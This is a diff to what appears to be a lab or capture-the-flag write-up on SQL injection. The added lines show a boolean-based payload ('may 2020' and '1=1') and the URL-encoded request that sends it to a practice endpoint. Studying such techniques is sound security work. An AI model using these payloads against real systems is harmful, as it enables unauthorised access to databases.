@@ -169,7 +169,14 @@ query: http://sqli2.naham.sec:8081/article-count?date=may%202020%27
 (response : count=0)
 
 ```
-using this logic, lets try to find a successful execution of maliciously crafted sql 
+using this logic, lets try to find a successful execution of maliciously crafted sql query to get a successful response from DB as per our intention.
+
+
+lets try  this payload  ( may 2020' and '1=1 )
+http://sqli2.naham.sec:8081/article-count?date=may%202020%27%20and%20%271=1
+![[Screenshot From 2025-03-04 22-41-07.png]]
+
+
 
 ---
 
